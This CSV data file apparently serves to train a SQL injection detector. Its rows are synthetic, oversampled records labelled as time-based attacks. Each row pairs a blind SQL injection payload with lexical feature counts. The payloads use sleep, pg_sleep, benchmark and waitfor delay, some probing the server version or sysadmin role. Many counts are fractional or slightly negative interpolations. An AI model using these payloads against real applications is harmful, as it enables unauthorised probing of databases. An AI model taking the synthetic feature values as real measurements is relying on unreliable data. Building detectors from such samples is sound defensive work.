id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.1626489671538387,48.3711529426466,19.022691765587965,3.2310692487726325,13.0,7.742305885293211,20.0,7.628847057353394,0.26941111633137516,0.1555700497313546,0.414478640509808,0.16054019342746226,0.0,0.0,0.6515388229413579,0.0,0.0,0.0,0.0,4.0,0.0,1.6288470573533946,0.674230588529321,0.6515388229413579,0.0,0.0,0.32576941147067895,0.674230588529321,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6742305885293209,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.674230588529321
SMOTE_000033,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.11118048267991233,29.19933935203949,16.0,3.3603688523783384,11.0,0.0,10.159471481631591,8.039867870407898,0.3773715889722066,0.0,0.34715409323335217,0.2754743177944413,0.0,1.019933935203949,0.0,0.0,0.0,0.019933935203948733,0.0,2.019933935203949,0.0,4.0,-5.551115123125783e-17,0.019933935203948927,0.0,1.0,0.0,0.9800660647960512,0.0,0.019933935203948733,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,2.8850295766978524,81.87907153736978,30.07726960280158,4.145137566224005,36.66181568224127,4.6618156822412615,24.47817057008568,16.07726960280158,0.45853590989372534,0.05449682137138229,0.2894274714783516,0.19753979725654086,3.1690921588793692,0.0,2.0,0.0,0.0,0.0,0.4154539205603156,3.6618156822412624,0.0,0.5845460794396846,1.4154539205603156,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.4154539205603156,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4154539205603154
SMOTE_000035,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.44633953605511306,45.0,17.0,3.0740066546775076,13.0,0.8476294571204852,20.0,11.152370542879515,0.28888888888888886,0.018836210158233006,0.4444444444444444,0.24783045650843366,0.0,0.1523705428795147,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.15237054287951468,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000036,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.1480539624835487,33.36100291489727,15.908714702128181,3.181492267561609,11.0,0.9087147021281814,13.543573510640908,7.908714702128181,0.331186239581841,0.026726903003770043,0.4046050746767201,0.23748178273766885,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.908714702128181,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.2059658417712484,27.832676127134878,15.416338063567439,3.344439681742013,11.0,0.0,9.416338063567439,7.416338063567439,0.39570953078099147,0.0,0.3381188283168671,0.2661716409021414,0.0,0.41633806356743897,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.41633806356743897,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.044851603375406,103.15918018648901,32.334909434423366,4.058748066466211,42.65799811067149,6.501182075817523,35.33254528278832,18.667454717211683,0.4103858641843763,0.06394991145179238,0.3435027917438417,0.18216143261998968,2.3325452827883177,0.0,2.0,0.0,0.0,0.0,0.8337273586058412,6.0,0.0,0.0,1.8337273586058411,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.8337273586058412,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8337273586058412,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.833727358605841
SMOTE_000039,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.503979924512032,104.54666047068065,32.04280832196197,4.0476849700714235,44.264554229209175,6.2821062414714754,35.478595839019015,18.521404160980985,0.41933913147599766,0.06129277318087253,0.34064928297714947,0.17871881236598033,2.4785958390190164,0.0,2.0,0.0,0.0,0.0,0.7607020804904919,6.0,0.0,0.0,1.760702080490492,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.7607020804904919,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7607020804904919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.760702080490492
SMOTE_000040,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.9661480394466985,33.794756440236796,22.6986891100592,4.291049552968203,16.0,2.0,4.096067330177599,11.698689110059199,0.4749160340610242,0.05936450425762802,0.11925214226270228,0.3464673194186455,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.6986891100591999,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6986891100591996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.142572034024487,28.953278302659093,15.39065566053182,3.2717464108756644,11.0,0.0,10.562622642127273,7.390655660531818,0.3825392808689236,0.0,0.36181864191377844,0.255642077217298,0.39065566053181844,0.0,0.0,0.0,0.0,0.3906556605318185,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.39065566053181855,0.39065566053181844,0.0,0.0,0.6093443394681817,0.0,0.3906556605318185,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.6533663767294292,30.26548217262129,21.26548217262129,4.256300861533996,15.412385738097033,2.4407106964272263,2.1469035654757427,10.26548217262129,0.5081094827779992,0.08328916531513825,0.07198889104777348,0.33661246085908914,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,3.412385738097032,0.853096434524258,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.4226873872970178,36.43522314223459,23.717611571117295,4.297997495951049,16.0,2.0,5.7176115711172955,12.717611571117297,0.4394103704434336,0.0549262963054292,0.15671064809106752,0.3489526851600697,2.0,0.717611571117297,2.0,0.0,0.0,0.0,0.7176115711172969,1.0000000000000002,0.0,4.0,0.282388428882703,2.0,1.0,0.7176115711172969,1.0,0.0,0.0,0.0,1.0,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.2748768296777673,40.57632969268612,16.0,2.949000374255021,11.0,0.0,19.351139736588106,10.225189956098017,0.27238593833915975,0.0,0.47509504752429543,0.2525190141365448,0.0,2.0,0.0,0.0,0.0,1.0,0.0,3.225189956098018,0.0,4.0,-5.551115123125783e-17,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,2.1201599892137972,34.41102348958036,16.601224832175596,3.34452202663322,12.202449664351189,0.0,12.404899328702381,9.803674496526785,0.3569417258446466,0.0,0.3590125640985168,0.2840457100568366,0.0,1.0,1.2024496643511908,0.0,0.0,0.0,0.0,2.6012248321755953,0.0,4.601224832175595,-5.551115123125783e-17,1.2024496643511906,0.0,1.0,0.6012248321755954,0.3987751678244047,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.39877516782440475,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3987751678244047
SMOTE_000046,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.030988335780368,43.66776624888887,16.0,2.793903956235128,11.0,0.0,22.445177499259245,10.222588749629622,0.2521003899202338,0.0,0.5138785515634947,0.23402105851627153,0.777411250370378,0.4451774992592441,0.0,0.0,0.0,1.0,0.0,4.0,0.0,4.0,-5.551115123125783e-17,1.0,0.777411250370378,0.22258874962962213,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.278436824868531,32.729078354579116,19.69163134183165,3.999166740879202,13.794420894554431,3.6541843290841762,6.140236565470255,9.140236565470255,0.4295553499094426,0.12792063863348313,0.17303838240008373,0.2694856290569906,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.8972104472772162,0.0,1.7944208945544313,0.44860522363860783,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.4486052236386079,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.5597965714863942,39.794814013420435,23.30129649664489,4.133116350820646,16.0,2.0,8.794814013420435,13.0,0.40295515872463616,0.05036939484057952,0.21927437997101745,0.3274010664637669,2.0,0.3012964966448912,2.0,0.0,0.0,0.0,0.3012964966448912,1.6987035033551088,0.0,4.0,0.6987035033551087,2.0,1.0,0.3012964966448913,1.0,0.0,0.0,0.0,1.0,0.3012964966448912,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.054476244795439444,119.0,29.326176965591127,4.0055534516148725,61.0,4.0,37.0,17.0,0.5126050420168067,0.03361344537815126,0.31092436974789917,0.14285714285714285,4.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.7275348028343411,21.00987527776693,11.641750151509232,2.9011971866442017,6.641750151509232,1.4527499494969225,8.547250050503077,4.368125126257694,0.30555962900063516,0.0807083305276068,0.41718677909371643,0.19654526137804157,0.0,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0945001010061548,-5.551115123125783e-17,0.0,0.0,0.27362502525153876,0.0,0.27362502525153876,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2736250252515386
SMOTE_000051,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.31758008919675357,69.89228580831548,27.10771419168453,4.235856722877549,36.78457161663094,3.8922858083154717,16.10771419168453,13.10771419168453,0.5262744178584873,0.05567098620058408,0.23048932101136013,0.1875652749295685,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,3.1077141916845283,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.10771419168452843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1077141916845283
SMOTE_000052,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.3660152176555087,33.0,17.0,3.504123773197531,13.0,0.45990043129080505,10.0,9.540099568709195,0.3939393939393939,0.013936376705781968,0.30303030303030304,0.289093926324521,0.0,0.540099568709195,2.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.540099568709195,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000053,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.00606299358244697,39.034769306747265,16.0,3.0006814431863624,11.0,0.0,18.029802262926225,10.004967043821038,0.2818380923220625,0.0,0.46183748089892535,0.2563244267790121,0.0,2.0,0.0,0.0,0.0,1.0,0.0,3.004967043821037,0.0,4.0,-5.551115123125783e-17,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.09015704252503805,38.961054191346804,16.0,3.001949487941658,11.0,0.0,17.980527095673402,9.980527095673402,0.28234816624752956,0.0,0.46149797732988235,0.2561538564225881,0.019472904326598872,1.9610541913468025,0.0,0.0,0.0,1.0,0.0,3.0,0.0,4.0,-5.551115123125783e-17,1.0,0.019472904326598872,0.9805270956734012,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.09049162711751593,35.36420019146411,23.0,4.269710289565705,16.0,2.0,5.303500159553421,12.060700031910685,0.45308208845754305,0.05663526105719288,0.14899059555891933,0.34129205492634473,2.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0607000319106845,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4973657569485737,104.52666527412444,32.04701783702643,4.0477537025405095,44.24140189635462,6.285263377769825,35.476491081486785,18.523508918513215,0.4192101045331604,0.06133106561832869,0.3406904053406994,0.17876842450781155,2.4764910814867838,0.0,2.0,0.0,0.0,0.0,0.7617544592566082,6.0,0.0,0.0,1.7617544592566081,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.7617544592566082,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7617544592566082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7617544592566086
SMOTE_000057,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.19107397340293195,27.131929720277764,15.065964860138882,3.3304999094410954,11.0,0.0,9.065964860138882,7.065964860138882,0.4055539886040161,0.0,0.33409155011653885,0.260354461279445,0.0,0.06596486013888136,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.06596486013888131,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.4256151107309194,35.24694343040568,17.0,3.4255036098236866,13.0,0.5506113139188642,11.797554744324543,9.898777372162272,0.37064572201333823,0.01668519133087467,0.33241616607548097,0.2802529205803061,0.0,0.4493886860811359,2.0,0.0,0.0,0.0,0.0,2.449388686081136,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.4493886860811359,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000059,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.8001412786349418,40.52561978186048,16.0,2.925455905650987,11.0,0.0,19.525619781860478,10.0,0.27204423518159493,0.0,0.48064282374422784,0.24731294107417723,0.3814049454651196,1.237190109069761,0.0,0.0,0.0,1.0,0.0,3.38140494546512,0.0,4.0,-5.551115123125783e-17,1.0,0.3814049454651197,0.6185950545348804,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.39201398561124506,40.02074931674918,17.0,3.2555131318277537,13.0,0.0,15.73207084292787,11.288678473821312,0.3267428414516144,0.0,0.3903673693548365,0.28288978919354907,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.2886784738213115,0.0,5.0,-5.551115123125783e-17,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000061,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5177240481898164,28.380951014344944,17.591836149004976,3.917818589126601,13.295918074502488,3.802721283665008,3.6904755071724704,7.591836149004976,0.4724818652439773,0.13834658590928223,0.12420956246668646,0.26496198638005397,2.901360641832504,0.0,2.0,0.0,0.0,0.0,0.0,0.19727871633499205,0.0,0.3945574326699841,0.09863935816749603,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.09863935816749592,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.124203986040123,100.37637715667205,32.940572027893886,4.069878035425007,39.43580512877816,6.940572027893886,35.03961864807074,18.960381351929257,0.3924287230056812,0.06927920694896507,0.34922593817844977,0.18906613186690394,2.0396186480707423,0.0,2.0,0.0,0.0,0.0,0.9801906759646288,6.0,0.0,0.0,1.9801906759646286,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9801906759646288,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9801906759646288,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9801906759646286
SMOTE_000063,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.036228579990188754,32.05497187768459,23.010994375536917,4.374217022033143,16.0,2.0,2.0439775021476727,12.010994375536917,0.4992571367880461,0.06240714209850576,0.06359572323763202,0.37473999787581613,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.010994375536917733,0.0,4.0,-5.551115123125783e-17,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.010994375536917733,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.02918211044612896,69.99010225280068,27.009897747199307,4.239426612096372,36.98020450560138,3.9901022528006913,16.009897747199307,13.00989774719931,0.5283603586000976,0.057007608423363484,0.22874766175137484,0.1858843712251641,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,3.0098977471993087,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.009897747199308582,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0098977471993087
